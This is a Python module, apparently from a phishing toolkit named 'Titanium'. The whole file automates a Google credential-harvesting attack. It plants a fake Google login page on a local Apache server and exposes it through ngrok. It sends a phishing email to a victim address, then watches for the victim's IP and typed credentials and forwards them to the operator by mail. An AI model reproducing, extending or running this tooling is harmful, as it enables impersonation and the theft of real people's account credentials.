import shutil
from Core.Support import Font
from Core.Support import Network
from Core.Support import Mailer
from Core.Support import Creds
from time import sleep
import os
import getpass
from pyngrok import ngrok, conf

conf.get_default().ngrok_path = "Tunnel/ngrok"
nomefile = "/var/www/html/Titanium_files/credentials/Google/Credentials.txt"
nomefile2 = "/var/www/html/Titanium_files/credentials/Google/Ip.txt"
dest = "/var/www/html"
dest2 = "/var/www/html/Titanium_files/credentials/Google"
header_mail = "Google-Credentials"


class Google:
    
    @staticmethod
    def menu():
        conf = input(
            Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "GOOGLE TEMPLATE WILL BE INSERTED ON YOUR WEB SERVER ARE YOU SURE?: YES,NO" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        if conf == "yes" or conf == "YES":
            original = os.getcwd() + "/Server/Google/index.php"
            original2 = os.getcwd() + "/Server/Google/Login.php"
            original3 = os.getcwd() + "/Server/Google/Ip.txt"
            original4 = os.getcwd() + "/Server/Google/Credentials.txt"
            shutil.copy2(original, dest)
            shutil.copy2(original2, dest)
            shutil.copy2(original3, dest2)
            shutil.copy2(original4, dest2)
            os.system("chown -R www-data:www-data /var/www/html")
            print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "FILE ADDED TO YOUR WEBSERVER: " + dest)
            sc = int(input(
                Font.Color.GREEN + "\nWOULD YOU LIKE TO START THE ATTACK NOW(1)YES(2)NO?" + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
            if sc == 1:
                os.system("service apache2 start")
                mod = int(input(
                    Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "CHOOSE AN OPTION" + Font.Color.GREEN + "[+]" + Font.Color.WHITE + "\n(1)LOCALHOST\n(2)NGROK" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
                if mod == 1:
                    Network.Controller.Local()
                elif mod == 2:
                    Network.Controller.Wan()
                Token = False
                sc2 = int(input(
                    Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "WOULD YOU LIKE TO SEND A PHISHING-MAIL?(1)YES(2)NO" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
                if sc2 == 1:
                    email = (input(
                        Font.Color.WHITE + "\nINSERT YOUR GMAIL EMAIL" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
                    print(
                        Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "EMAIL INSERTED CORRECTLY:" + email + "\n")
                    password = getpass.getpass(
                        Font.Color.WHITE + "INSERT YOUR EMAIL PASSWORD" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
                    vict_email = input(
                        Font.Color.WHITE + "\nINSERT THE VICTIM MAIL" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
                    print(
                        Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "VICTIM EMAIL INSERTED CORRECTLY:" + vict_email + "\n")
                    links = str(input(
                        Font.Color.WHITE + "INSERT THE REDIRECT LINK" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
                    print(
                        Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "REDIRECT LINK INSERTED CORRECTLY:" + links + "\n")
                    Mailer.Sender.google_template(email, password, vict_email, links)
                    print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "TOKEN GENERATED")
                    Token = True
                else:
                    print(Font.Color.WHITE + "\nNOT SENDING THE EMAIL")
                print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "WAITING FOR VICTIM TO CLICK THE LINK:")
                con = 0
                while con == 0:
                    with open(nomefile2) as creds:
                        lines = creds.read().rstrip()
                        if len(lines) != 0:
                            print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "IP-INFO FOUND\n")
                            sleep(3)
                            for lines in creds:
                                print(Font.Color.GREEN + "[+]" + Font.Color.WHITE + lines.replace("\n",""))
                            con = 1
                if con == 1:
                    print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "WAITING FOR CREDENTIALS:")
                    con = 0
                    while con == 0:
                        with open(nomefile) as creds:
                            lines = creds.read().rstrip()
                            if len(lines) != 0:
                                print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "CREDENTIALS FOUND\n")
                                sleep(3)
                                print(Font.Color.WHITE + lines)
                                con = 1
                    if con == 1:
                        if Token:
                            Mailer.Sender.google_secured(email, password, vict_email)
                        else:
                            print(
                                Font.Color.RED + "[!]" + Font.Color.WHITE + "TOKEN NOT GENERATED NOT SENDING SECURED MAIL")
                        Creds.Sender.mail(header_mail, nomefile, nomefile2, dest2)
                        ngrok.kill()
                        os.system("service apache2 stop")

            elif sc == 2:
                print(
                    Font.Color.GREEN + "\n[+]" + Font.Color.YELLOW + "FOR AN ATTACK OVER WAN USE NGROK AND BEFORE STARTING YOU SHOULD ENABLE APACHE SERVICES,\nCREDENTIALS ON:/var/Titanium_files/credentials")
                inp = input("\nPRESS ENTER TO CONTINUE...")

            else:
                os.system('cls' if os.name == 'nt' else 'clear')

        else:
            print("\nFILE NOT ADDED")
            inp = input("\nPRESS ENTER TO CONTINUE...")
